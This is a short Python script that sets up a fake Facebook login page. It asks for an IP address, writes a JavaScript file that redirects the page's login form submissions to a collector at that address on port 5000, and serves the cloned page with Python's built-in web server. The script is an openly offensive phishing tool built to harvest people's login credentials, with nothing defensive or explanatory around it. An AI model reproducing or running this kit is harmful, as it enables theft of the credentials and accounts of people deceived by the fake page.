import os
import webbrowser

cwd = os.getcwd()

print('''
Options:
1. Facebook
''')

user_input = input("Choose Option: ")

ip_address = input("Enter Ip Address: ")

if user_input == "1":
  try:
    webbrowser.open(f"http://{ip_address}:8000/login.html")

  except:
    pass

  os.chdir(cwd + "/Websites/Facebook")
  open("website.js", "w").write(f'''let form = document.querySelector("#input"); form.action = "http://{ip_address}:5000/facebook";''')


  os.chdir(cwd + "/Websites/Facebook")
  try:
    os.system("python3 -m http.server")
  except:
    os.system("python -m http.server")
